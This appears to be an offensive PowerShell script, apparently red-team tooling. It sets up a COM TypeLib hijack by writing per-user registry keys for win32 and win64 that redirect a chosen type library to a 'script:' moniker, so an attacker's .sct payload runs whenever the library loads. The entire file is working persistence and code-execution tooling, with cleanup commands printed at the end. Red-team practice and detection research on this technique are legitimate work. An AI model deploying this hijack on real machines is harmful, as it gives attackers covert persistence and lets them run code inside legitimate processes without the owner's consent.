#!/usr/bin/env pwsh
# Create COM TypeLib hijack using script moniker
# Usage: . scripts/create-typelib-hijack.ps1 -LibId "{LIBID}" -Version "{VERSION}" -ScriptPath "C:\path\to\payload.sct"

param(
    [Parameter(Mandatory=$true)]
    [string]$LibId,
    
    [Parameter(Mandatory=$true)]
    [string]$Version,
    
    [Parameter(Mandatory=$true)]
    [string]$ScriptPath
)

Write-Host "[*] Creating TypeLib hijack..." -ForegroundColor Cyan
Write-Host "    LIBID: $LibId" -ForegroundColor Gray
Write-Host "    Version: $Version" -ForegroundColor Gray
Write-Host "    Script: $ScriptPath" -ForegroundColor Gray

# Validate script file exists
if (-not (Test-Path $ScriptPath)) {
    Write-Host "[!] Script file not found: $ScriptPath" -ForegroundColor Red
    exit 1
}

# Create the TypeLib path
$registryPath = "HKCU:Software\Classes\TypeLib\$LibId\$Version\0\win32"

try {
    # Create the registry key
    New-Item -Path $registryPath -Force | Out-Null
    Write-Host "[+] Created registry key: $registryPath" -ForegroundColor Green
    
    # Set the default value to script moniker
    $monikerPath = "script:$ScriptPath"
    Set-ItemProperty -Path $registryPath -Name '(default)' -Value $monikerPath -Force
    Write-Host "[+] Set TypeLib path to: $monikerPath" -ForegroundColor Green
    
    # Also set win64 for 64-bit consumers
    $registryPath64 = "HKCU:Software\Classes\TypeLib\$LibId\$Version\0\win64"
    New-Item -Path $registryPath64 -Force | Out-Null
    Set-ItemProperty -Path $registryPath64 -Name '(default)' -Value $monikerPath -Force
    Write-Host "[+] Set 64-bit TypeLib path to: $monikerPath" -ForegroundColor Green
    
    Write-Host "`n[+] TypeLib hijack created successfully!" -ForegroundColor Green
    Write-Host "[!] The script will execute when the TypeLib is loaded" -ForegroundColor Yellow
    Write-Host "`n[TIP] To clean up, run:" -ForegroundColor Cyan
    Write-Host "    Remove-Item -Recurse -Force '$registryPath' 2>`$null" -ForegroundColor Gray
    Write-Host "    Remove-Item -Recurse -Force '$registryPath64' 2>`$null" -ForegroundColor Gray
    Write-Host "    Remove-Item -Force '$ScriptPath' 2>`$null" -ForegroundColor Gray
    
} catch {
    Write-Host "[!] Error creating TypeLib hijack: $_" -ForegroundColor Red
    exit 1
}
